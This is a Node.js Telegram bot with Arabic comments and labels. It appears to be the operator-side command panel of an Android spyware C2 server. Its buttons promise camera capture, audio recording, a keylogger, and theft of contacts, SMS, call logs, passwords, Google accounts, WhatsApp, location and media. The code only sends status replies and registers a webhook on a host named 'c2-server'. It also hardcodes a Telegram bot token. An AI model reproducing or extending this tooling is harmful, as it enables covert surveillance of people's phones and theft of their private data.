const express = require('express');
const TelegramBot = require('node-telegram-bot-api');

const BOT_TOKEN = '7604669338:AAElI3Uy3cnB4rzmk5LTGHI3a5ws63ueYS0';
const app = express();
const PORT = process.env.PORT || 3000;
app.use(express.json());

const bot = new TelegramBot(BOT_TOKEN, { polling: false });

// قائمة الأزرار
const mainMenu = {
    reply_markup: {
        keyboard: [
            ['📸 الكاميرا الأمامية', '📸 الكاميرا الخلفية'],
            ['🎙️ تسجيل الصوت', '📂 سحب الملفات'],
            ['📞 جهات الاتصال', '✉️ الرسائل النصية'],
            ['📋 سجل المكالمات', '🔔 الإشعارات'],
            ['⌨️ كيلوجر', '👤 حسابات Google'],
            ['💬 واتساب', '🔑 كلمات المرور'],
            ['📍 الموقع', '🖼️ صور الهاتف'],
            ['🎥 فيديوهات', '🎵 مقاطع صوت'],
            ['❓ مساعدة']
        ],
        resize_keyboard: true
    }
};

bot.onText(/\/start/, (msg) => {
    bot.sendMessage(msg.chat.id, '✅ أهلاً بك! استخدم الأزرار أدناه:', mainMenu);
});

// معالجة الأزرار (تجاهل الأوامر التي تبدأ بـ /)
bot.on('message', (msg) => {
    const text = msg.text;
    if (!text || text.startsWith('/')) return;
    const chatId = msg.chat.id;
    const responses = {
        '📸 الكاميرا الأمامية': '📸 جاري التقاط صورة من الكاميرا الأمامية...',
        '📸 الكاميرا الخلفية': '📸 جاري التقاط صورة من الكاميرا الخلفية...',
        '🎙️ تسجيل الصوت': '🎙️ جاري تسجيل الصوت...',
        '📂 سحب الملفات': '📂 جاري سحب الملفات...',
        '📞 جهات الاتصال': '📇 جاري سحب جهات الاتصال...',
        '✉️ الرسائل النصية': '✉️ جاري سحب الرسائل...',
        '📋 سجل المكالمات': '📞 جاري سحب سجل المكالمات...',
        '🔔 الإشعارات': '🔔 بدء مراقبة الإشعارات...',
        '⌨️ كيلوجر': '⌨️ بدء تسجيل الضغطات...',
        '👤 حسابات Google': '👤 جاري سحب حسابات Google...',
        '💬 واتساب': '💬 بدء مراقبة واتساب...',
        '🔑 كلمات المرور': '🔑 جاري سحب كلمات المرور...',
        '📍 الموقع': '📍 جاري الحصول على الموقع...',
        '🖼️ صور الهاتف': '🖼️ جاري سحب الصور...',
        '🎥 فيديوهات': '🎥 جاري سحب الفيديوهات...',
        '🎵 مقاطع صوت': '🎵 جاري سحب المقاطع الصوتية...',
        '❓ مساعدة': '📱 الأوامر متاحة عبر الأزرار'
    };
    if (responses[text]) {
        bot.sendMessage(chatId, responses[text]);
    }
});

// نقطة استقبال Webhook
app.post(`/webhook/${BOT_TOKEN}`, (req, res) => {
    bot.processUpdate(req.body);
    res.sendStatus(200);
});

app.get('/', (req, res) => res.send('Bot active'));

app.listen(PORT, () => {
    console.log(`✅ Server on ${PORT}`);
    // تعيين Webhook يدويًا عبر طلب HTTP بسيط
    const https = require('https');
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/setWebhook?url=https://c2-server-ufyp.onrender.com/webhook/${BOT_TOKEN}`;
    https.get(url, (res) => {
        console.log('Webhook set response:', res.statusCode);
    }).on('error', (e) => console.error('Webhook error:', e.message));
});
